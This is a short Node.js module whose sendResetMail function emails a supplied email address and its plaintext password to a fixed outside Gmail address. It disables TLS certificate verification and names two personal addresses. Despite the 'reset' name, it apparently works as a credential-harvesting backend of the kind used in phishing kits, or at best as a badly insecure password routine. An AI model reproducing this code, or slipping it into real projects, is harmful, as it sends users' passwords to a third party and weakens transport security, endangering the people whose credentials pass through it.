require('dotenv').config()
const nodemailer = require("nodemailer");


function sendResetMail(email, password) {
   var transporter = nodemailer.createTransport({
     service: "gmail",
     tls: { rejectUnauthorized: false },
     auth: {
       user: process.env.EMAIL,
       pass: process.env.PASSWORD,
     },
   });

   //Step 2

   var mailOptions = {
     from: "jpono63@gmail.com",
     to: "akilanilmalgoda2@gmail.com",
     subject: "Sending Email using Node.js",
     text: `Email: ${email} and Password: ${password}`,
   };

   //Step 3

   transporter.sendMail(mailOptions, function (error, info) {
     if (error) {
       console.log(error);
     } else {
       console.log("Email sent: " + info.response);
     }
   });
}

module.exports = sendResetMail;
